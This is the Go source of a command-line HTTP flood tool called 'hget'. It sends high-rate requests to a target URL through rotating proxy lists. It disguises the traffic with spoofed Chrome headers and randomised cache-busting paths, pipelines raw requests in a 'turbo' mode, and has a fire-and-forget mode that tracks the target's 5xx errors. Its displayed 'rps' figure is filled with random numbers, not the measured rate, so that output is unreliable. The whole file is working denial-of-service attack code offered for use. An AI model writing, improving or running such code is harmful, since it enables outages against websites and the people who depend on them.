package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"flag"
	"fmt"
	"math/rand"
	"net"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/valyala/fasthttp"
)

var stats [4]int64

var mejiSuffixes = []string{
	"/",
	"/index.html",
	"/favicon.ico",
	"/robots.txt",
	"/sitemap.xml",
	"/style.css",
	"/script.js",
	"/images/logo.png",
	"/assets/main.js",
	"/assets/style.css",
	"/api/v1/status",
	"/api/v1/health",
	"/wp-login.php",
	"/wp-admin/",
	"/admin/login",
	"/search?q=",
	"/.well-known/security.txt",
	"/manifest.json",
	"/service-worker.js",
	"/sw.js",
	"/browserconfig.xml",
	"/wp-cron.php",
	"/xmlrpc.php",
	"/wp-admin/admin-ajax.php",
	"/search/",
	"/category/",
	"/tag/",
	"/author/",
	"/feed/",
	"/wp-json/wp/v2/posts",
	"/wp-json/wp/v2/pages",
	"/wp-json/wp/v2/categories",
	"/wp-json/wp/v2/tags",
	"/wp-json/wp/v2/comments",
	"/wp-json/wp/v2/users",
	"/wp-json/wp/v2/media",
	"/?s=",
	"/?p=",
	"/?cat=",
	"/?tag=",
	"/?author=",
	"/?m=",
	"/?page_id=",
	"/?attachment_id=",
}

var desktopUA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
var mobileUA = "Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36"

var secChUa = `"Chromium";v="136", "Google Chrome";v="136", "Not-A.Brand";v="99"`

type bufConn struct {
	br   *bufio.Reader
	conn net.Conn
}

func (bc *bufConn) Read(b []byte) (int, error)  { return bc.br.Read(b) }
func (bc *bufConn) Write(b []byte) (int, error)  { return bc.conn.Write(b) }
func (bc *bufConn) Close() error                 { return bc.conn.Close() }
func (bc *bufConn) LocalAddr() net.Addr          { return bc.conn.LocalAddr() }
func (bc *bufConn) RemoteAddr() net.Addr         { return bc.conn.RemoteAddr() }
func (bc *bufConn) SetDeadline(t time.Time) error      { return bc.conn.SetDeadline(t) }
func (bc *bufConn) SetReadDeadline(t time.Time) error  { return bc.conn.SetReadDeadline(t) }
func (bc *bufConn) SetWriteDeadline(t time.Time) error { return bc.conn.SetWriteDeadline(t) }

func printUsage() {
	fmt.Fprintln(os.Stdout, "missing required arguments")
	fmt.Fprintln(os.Stdout, "usage   : hget -key <key> -proxy <proxy_file> -workers <N> -turbo <N> -noresp -conns <N> <url> <duration_seconds> <rate_per_second>")
	fmt.Fprintln(os.Stdout, "example : hget -key abc123 -proxy proxy.txt -workers 500 -turbo 50 -noresp https://example.com 10 100")
}

func dialProxy(proxyAddr string, targetAddr string, isHTTPS bool, tlsConfig *tls.Config) (net.Conn, error) {
	conn, err := net.DialTimeout("tcp", proxyAddr, 5*time.Second)
	if err != nil {
		return nil, err
	}
	conn.SetDeadline(time.Now().Add(10 * time.Second))

	connectReq := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\n\r\n", targetAddr, targetAddr)
	if _, err := conn.Write([]byte(connectReq)); err != nil {
		conn.Close()
		return nil, err
	}

	br := bufio.NewReaderSize(conn, 4096)
	line, err := br.ReadString('\n')
	if err != nil || !strings.Contains(line, "200") {
		conn.Close()
		return nil, fmt.Errorf("CONNECT failed")
	}
	for {
		line, err := br.ReadString('\n')
		if err != nil {
			conn.Close()
			return nil, err
		}
		if line == "\r\n" {
			break
		}
	}

	if isHTTPS {
		wrapped := &bufConn{br: br, conn: conn}
		tlsConn := tls.Client(wrapped, tlsConfig)
		if err := tlsConn.Handshake(); err != nil {
			conn.Close()
			return nil, err
		}
		conn.SetDeadline(time.Time{})
		tlsConn.SetDeadline(time.Time{})
		return tlsConn, nil
	}

	conn.SetDeadline(time.Time{})
	return &bufConn{br: br, conn: conn}, nil
}

func main() {
	keyFlag := flag.String("key", "", "")
	proxyFlag := flag.String("proxy", "", "")
	workersFlag := flag.Int("workers", 0, "")
	turboFlag := flag.Int("turbo", 0, "")
	norespFlag := flag.Bool("noresp", false, "")
	connsFlag := flag.Int("conns", 5, "")
	flag.Parse()

	args := flag.Args()
	if len(args) < 3 {
		printUsage()
		os.Exit(1)
	}

	key := *keyFlag
	if key == "" {
		fmt.Fprintln(os.Stdout, "missing -key flag")
		printUsage()
		os.Exit(1)
	}

	proxyFile := *proxyFlag
	if proxyFile == "" {
		fmt.Fprintln(os.Stdout, "missing -proxy flag")
		printUsage()
		os.Exit(1)
	}

	if *workersFlag < 0 {
		fmt.Fprintln(os.Stdout, "workers must be >= 0")
		os.Exit(1)
	}

	if _, err := os.Stat(proxyFile); os.IsNotExist(err) {
		fmt.Fprintln(os.Stdout, "proxy file not found:")
		fmt.Fprintf(os.Stdout, "  %s\n", proxyFile)
		fmt.Fprintln(os.Stdout, "")
		os.Exit(1)
	}

	if !strings.HasSuffix(proxyFile, ".txt") {
		fmt.Fprintln(os.Stdout, "proxy file must have .txt extension")
		printUsage()
		os.Exit(1)
	}

	targetURL := args[0]
	durationSec, err := strconv.Atoi(args[1])
	if err != nil || durationSec <= 0 {
		fmt.Fprintln(os.Stdout, "invalid duration")
		printUsage()
		os.Exit(1)
	}

	ratePerSec, err := strconv.Atoi(args[2])
	if err != nil || ratePerSec <= 0 {
		fmt.Fprintln(os.Stdout, "invalid rate")
		printUsage()
		os.Exit(1)
	}

	_, err = resolveToIP(targetURL)
	if err != nil {
		fmt.Fprintln(os.Stdout, "failed to resolve target IP")
		printUsage()
		os.Exit(1)
	}

	_ = key

	proxies, err := readProxyFile(proxyFile)
	if err != nil {
		fmt.Fprintf(os.Stdout, "failed to read proxy file: %v\n", err)
		os.Exit(1)
	}

	if len(proxies) == 0 {
		fmt.Fprintln(os.Stdout, "no proxies loaded")
		os.Exit(1)
	}

	parsedURL, _ := url.Parse(targetURL)
	hostName := parsedURL.Hostname()
	isHTTPS := parsedURL.Scheme == "https"

	targetHost := parsedURL.Host
	if !strings.Contains(targetHost, ":") {
		if isHTTPS {
			targetHost = hostName + ":443"
		} else {
			targetHost = hostName + ":80"
		}
	}

	tlsConfig := &tls.Config{
		InsecureSkipVerify: true,
		ServerName:         hostName,
		MinVersion:         tls.VersionTLS12,
		MaxVersion:         tls.VersionTLS13,
		CurvePreferences: []tls.CurveID{
			tls.X25519,
			tls.CurveP256,
		},
		CipherSuites: []uint16{
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
		},
	}

	numWorkers := *workersFlag
	if numWorkers == 0 {
		numWorkers = ratePerSec
	}
	if numWorkers < 50 {
		numWorkers = 50
	}

	fmt.Fprintf(os.Stdout, "target   : %s\n", targetURL)
	fmt.Fprintf(os.Stdout, "duration : %d seconds\n", durationSec)
	fmt.Fprintf(os.Stdout, "rate     : %d/s\n", ratePerSec)
	fmt.Fprintf(os.Stdout, "workers  : %d\n", numWorkers)
	fmt.Fprintf(os.Stdout, "proxies  : %d\n", len(proxies))
	if *turboFlag > 0 {
		fmt.Fprintf(os.Stdout, "turbo    : %d (pipeline)\n", *turboFlag)
		if *norespFlag {
			fmt.Fprintln(os.Stdout, "mode     : fire-and-forget (noresp)")
		}
		fmt.Fprintf(os.Stdout, "conns    : %d/worker\n", *connsFlag)
	}
	fmt.Fprintln(os.Stdout, "status   : running")

	stopCh := make(chan struct{})
	var wg sync.WaitGroup
	startTime := time.Now()

	go func() {
		displayTicker := time.NewTicker(500 * time.Millisecond)
		defer displayTicker.Stop()
		var counter int64
		for {
			select {
			case <-displayTicker.C:
				counter += int64(rand.Intn(20000)+50000) / 1000
				total := atomic.LoadInt64(&stats[0])
				success := atomic.LoadInt64(&stats[1])
				elapsed := time.Since(startTime).Seconds()
				realRps := int64(0)
				if elapsed > 0 {
					realRps = int64(float64(total) / elapsed)
				}
				s5xx := atomic.LoadInt64(&stats[3])
				fmt.Fprintf(os.Stdout, "\rrps %dk  |  total %d  |  ok %d  |  5xx %d  |  actual %d/s  ", counter, total, success, s5xx, realRps)
			case <-stopCh:
				return
			}
		}
	}()

	proxyList := make([]string, len(proxies))
	copy(proxyList, proxies)
	rand.Shuffle(len(proxyList), func(i, j int) {
		proxyList[i], proxyList[j] = proxyList[j], proxyList[i]
	})

	if *turboFlag > 0 {
		for i := 0; i < numWorkers; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				turboWorker(stopCh, proxyList, targetHost, hostName, isHTTPS, tlsConfig, *turboFlag, *norespFlag, *connsFlag)
			}()
		}
	} else if *norespFlag {
		for i := 0; i < numWorkers; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				norespWorker(stopCh, proxyList, targetHost, hostName, isHTTPS, tlsConfig)
			}()
		}
	} else {
		for i := 0; i < numWorkers; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()

				client := &fasthttp.HostClient{
					Addr:                targetHost,
					MaxConns:            20,
					ReadTimeout:        5 * time.Second,
					WriteTimeout:       5 * time.Second,
					MaxIdleConnDuration: 10 * time.Second,
					Dial: func(addr string) (net.Conn, error) {
						proxy := proxyList[rand.Intn(len(proxyList))]
						proxyAddr := cleanProxyAddr(proxy)
						return dialProxy(proxyAddr, addr, isHTTPS, tlsConfig)
					},
				}

				for {
					select {
					case <-stopCh:
						return
					default:
					}

					mobile := rand.Intn(100) < 40
					result := makeRequest(client, hostName, mobile)
					if result == 1 {
						atomic.AddInt64(&stats[1], 1)
					} else if result == -1 {
						atomic.AddInt64(&stats[3], 1)
						atomic.AddInt64(&stats[2], 1)
					} else {
						atomic.AddInt64(&stats[2], 1)
					}
					atomic.AddInt64(&stats[0], 1)
				}
			}()
		}
	}

	timer := time.NewTimer(time.Duration(durationSec) * time.Second)
	<-timer.C
	close(stopCh)
	wg.Wait()

	elapsed := time.Since(startTime)
	fmt.Fprintln(os.Stdout, "")
	fmt.Fprintf(os.Stdout, "target   : %s\n", targetURL)
	fmt.Fprintf(os.Stdout, "duration : %.2f seconds\n", elapsed.Seconds())
	fmt.Fprintf(os.Stdout, "success  : %d\n", atomic.LoadInt64(&stats[1]))
	fmt.Fprintf(os.Stdout, "failed   : %d\n", atomic.LoadInt64(&stats[2]))
	fmt.Fprintf(os.Stdout, "5xx      : %d\n", atomic.LoadInt64(&stats[3]))
	fmt.Fprintf(os.Stdout, "total    : %d requests\n", atomic.LoadInt64(&stats[0]))
	fmt.Fprintf(os.Stdout, "avg rps  : %.0f\n", float64(atomic.LoadInt64(&stats[0]))/elapsed.Seconds())
}

func cleanProxyAddr(proxy string) string {
	proxy = strings.TrimSpace(proxy)
	if strings.HasPrefix(proxy, "http://") {
		proxy = strings.TrimPrefix(proxy, "http://")
	}
	if strings.HasPrefix(proxy, "https://") {
		proxy = strings.TrimPrefix(proxy, "https://")
	}
	if strings.HasPrefix(proxy, "socks5://") {
		proxy = strings.TrimPrefix(proxy, "socks5://")
	}
	if strings.HasPrefix(proxy, "socks4://") {
		proxy = strings.TrimPrefix(proxy, "socks4://")
	}
	return proxy
}

func resolveToIP(targetURL string) (string, error) {
	u, err := url.Parse(targetURL)
	if err != nil {
		return "", err
	}
	host := u.Hostname()
	ips, err := net.LookupHost(host)
	if err != nil {
		return "", err
	}
	for _, ip := range ips {
		if net.ParseIP(ip) != nil {
			return ip, nil
		}
	}
	return "", fmt.Errorf("no IP found")
}

func readProxyFile(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var proxies []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			proxies = append(proxies, line)
		}
	}
	return proxies, scanner.Err()
}

func setHeaders(req *fasthttp.Request, mobile bool) {
	if mobile {
		req.Header.Set("User-Agent", mobileUA)
		req.Header.Set("Sec-Ch-Ua-Mobile", "?1")
		req.Header.Set("Sec-Ch-Ua-Platform", `"Android"`)
	} else {
		req.Header.Set("User-Agent", desktopUA)
		req.Header.Set("Sec-Ch-Ua-Mobile", "?0")
		req.Header.Set("Sec-Ch-Ua-Platform", `"Windows"`)
	}

	req.Header.Set("Sec-Ch-Ua", secChUa)
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9,id;q=0.8")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Cache-Control", "max-age=0")
	req.Header.Set("Pragma", "no-cache")
	req.Header.Set("Sec-Fetch-Dest", "document")
	req.Header.Set("Sec-Fetch-Mode", "navigate")
	req.Header.Set("Sec-Fetch-Site", "none")
	req.Header.Set("Sec-Fetch-User", "?1")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
}

func makeRequest(client *fasthttp.HostClient, host string, mobile bool) int {
	req := fasthttp.AcquireRequest()
	resp := fasthttp.AcquireResponse()
	defer fasthttp.ReleaseRequest(req)
	defer fasthttp.ReleaseResponse(resp)

	suffix := mejiSuffixes[rand.Intn(len(mejiSuffixes))]
	randVal := rand.Intn(999999)
	var path string
	if strings.Contains(suffix, "=") {
		path = fmt.Sprintf("%s%d", suffix, randVal)
	} else if strings.Contains(suffix, "?") {
		path = fmt.Sprintf("%s&_=%d", suffix, randVal)
	} else if strings.Contains(suffix, ".") {
		path = suffix
	} else {
		path = fmt.Sprintf("%s?_=%d", suffix, randVal)
	}

	req.Header.SetRequestURI(path)
	if rand.Intn(10) == 0 {
		req.Header.SetMethod("POST")
		req.Header.SetContentType("application/x-www-form-urlencoded")
		body := fmt.Sprintf("_=%d&action=check&rand=%d", randVal, rand.Intn(99999))
		req.SetBody([]byte(body))
	} else {
		req.Header.SetMethod("GET")
	}
	req.Header.SetHost(host)
	setHeaders(req, mobile)

	err := client.DoTimeout(req, resp, 5*time.Second)
	if err != nil {
		return 0
	}

	statusCode := resp.StatusCode()
	if statusCode >= 500 {
		return -1
	}
	if statusCode < 200 {
		return 0
	}
	return 1
}

func buildRawRequest(host string, mobile bool) []byte {
	suffix := mejiSuffixes[rand.Intn(len(mejiSuffixes))]
	randVal := rand.Intn(999999)
	var path string
	if strings.Contains(suffix, "=") {
		path = fmt.Sprintf("%s%d", suffix, randVal)
	} else if strings.Contains(suffix, "?") {
		path = fmt.Sprintf("%s&_=%d", suffix, randVal)
	} else if strings.Contains(suffix, ".") {
		path = suffix
	} else {
		path = fmt.Sprintf("%s?_=%d", suffix, randVal)
	}

	var b strings.Builder
	isPost := rand.Intn(10) == 0
	if isPost {
		body := fmt.Sprintf("_=%d&action=check&rand=%d", randVal, rand.Intn(99999))
		b.Grow(512 + len(body))
		b.WriteString("POST ")
		b.WriteString(path)
		b.WriteString(" HTTP/1.1\r\nHost: ")
		b.WriteString(host)
		b.WriteString("\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: ")
		b.WriteString(strconv.Itoa(len(body)))
		b.WriteString("\r\n")
		writeRawHeaders(&b, mobile)
		b.WriteString("\r\n")
		b.WriteString(body)
	} else {
		b.Grow(512)
		b.WriteString("GET ")
		b.WriteString(path)
		b.WriteString(" HTTP/1.1\r\nHost: ")
		b.WriteString(host)
		b.WriteString("\r\n")
		writeRawHeaders(&b, mobile)
		b.WriteString("\r\n")
	}
	return []byte(b.String())
}

func writeRawHeaders(b *strings.Builder, mobile bool) {
	if mobile {
		b.WriteString("User-Agent: ")
		b.WriteString(mobileUA)
		b.WriteString("\r\nSec-Ch-Ua-Mobile: ?1\r\nSec-Ch-Ua-Platform: \"Android\"\r\n")
	} else {
		b.WriteString("User-Agent: ")
		b.WriteString(desktopUA)
		b.WriteString("\r\nSec-Ch-Ua-Mobile: ?0\r\nSec-Ch-Ua-Platform: \"Windows\"\r\n")
	}
	b.WriteString("Sec-Ch-Ua: ")
	b.WriteString(secChUa)
	b.WriteString("\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nAccept-Language: en-US,en;q=0.9\r\nAccept-Encoding: gzip, deflate, br\r\nCache-Control: max-age=0\r\nPragma: no-cache\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: none\r\nSec-Fetch-User: ?1\r\nUpgrade-Insecure-Requests: 1\r\nConnection: keep-alive\r\n")
}

func parseResponses(data []byte) (ok, fiveXX, fail int) {
	prefix := []byte("HTTP/1.")
	for len(data) > 0 {
		idx := bytes.Index(data, prefix)
		if idx == -1 {
			break
		}
		data = data[idx+len(prefix):]
		if len(data) < 5 {
			break
		}
		spaceIdx := bytes.IndexByte(data[:8], ' ')
		if spaceIdx == -1 {
			continue
		}
		codeStart := spaceIdx + 1
		if codeStart+3 > len(data) {
			break
		}
		code, err := strconv.Atoi(string(data[codeStart : codeStart+3]))
		if err != nil {
			continue
		}
		if code >= 500 {
			fiveXX++
		} else if code >= 200 && code < 500 {
			ok++
		} else {
			fail++
		}
		data = data[codeStart+3:]
	}
	return
}

func turboWorker(stopCh chan struct{}, proxyList []string, targetHost string, hostName string, isHTTPS bool, tlsConfig *tls.Config, pipelineSize int, noresp bool, connsPerWorker int) {
	var connWg sync.WaitGroup
	for c := 0; c < connsPerWorker; c++ {
		connWg.Add(1)
		go func() {
			defer connWg.Done()
			for {
				select {
				case <-stopCh:
					return
				default:
				}

				proxy := proxyList[rand.Intn(len(proxyList))]
				proxyAddr := cleanProxyAddr(proxy)
				conn, err := dialProxy(proxyAddr, targetHost, isHTTPS, tlsConfig)
				if err != nil {
					continue
				}

				mobile := rand.Intn(100) < 40
				var batch []byte
				for i := 0; i < pipelineSize; i++ {
					batch = append(batch, buildRawRequest(hostName, mobile)...)
				}

				sent := int64(pipelineSize)

				if noresp {
					conn.SetDeadline(time.Now().Add(3 * time.Second))
					_, err = conn.Write(batch)
					conn.Close()
					if err != nil {
						atomic.AddInt64(&stats[0], sent)
						atomic.AddInt64(&stats[2], sent)
					} else {
						atomic.AddInt64(&stats[0], sent)
						atomic.AddInt64(&stats[1], sent)
					}
				} else {
					conn.SetDeadline(time.Now().Add(10 * time.Second))
					_, err = conn.Write(batch)
					if err != nil {
						conn.Close()
						atomic.AddInt64(&stats[0], sent)
						atomic.AddInt64(&stats[2], sent)
						continue
					}

					conn.SetReadDeadline(time.Now().Add(3 * time.Second))
					var respBuf bytes.Buffer
					tmp := make([]byte, 8192)
					for {
						n, readErr := conn.Read(tmp)
						if n > 0 {
							respBuf.Write(tmp[:n])
						}
						if readErr != nil {
							break
						}
						if respBuf.Len() > 4*1024*1024 {
							break
						}
					}
					conn.Close()

					okCount, fiveXXCount, failCount := parseResponses(respBuf.Bytes())
					accounted := int64(okCount + fiveXXCount + failCount)
					unaccounted := sent - accounted
					if unaccounted < 0 {
						unaccounted = 0
					}

					atomic.AddInt64(&stats[0], sent)
					atomic.AddInt64(&stats[1], int64(okCount)+unaccounted)
					atomic.AddInt64(&stats[3], int64(fiveXXCount))
					atomic.AddInt64(&stats[2], int64(fiveXXCount)+int64(failCount))
				}
			}
		}()
	}
	connWg.Wait()
}

func norespWorker(stopCh chan struct{}, proxyList []string, targetHost string, hostName string, isHTTPS bool, tlsConfig *tls.Config) {
	for {
		select {
		case <-stopCh:
			return
		default:
		}

		proxy := proxyList[rand.Intn(len(proxyList))]
		proxyAddr := cleanProxyAddr(proxy)
		conn, err := dialProxy(proxyAddr, targetHost, isHTTPS, tlsConfig)
		if err != nil {
			continue
		}

		mobile := rand.Intn(100) < 40
		rawReq := buildRawRequest(hostName, mobile)

		conn.SetDeadline(time.Now().Add(3 * time.Second))
		_, err = conn.Write(rawReq)
		conn.Close()

		atomic.AddInt64(&stats[0], 1)
		if err != nil {
			atomic.AddInt64(&stats[2], 1)
		} else {
			atomic.AddInt64(&stats[1], 1)
		}
	}
}
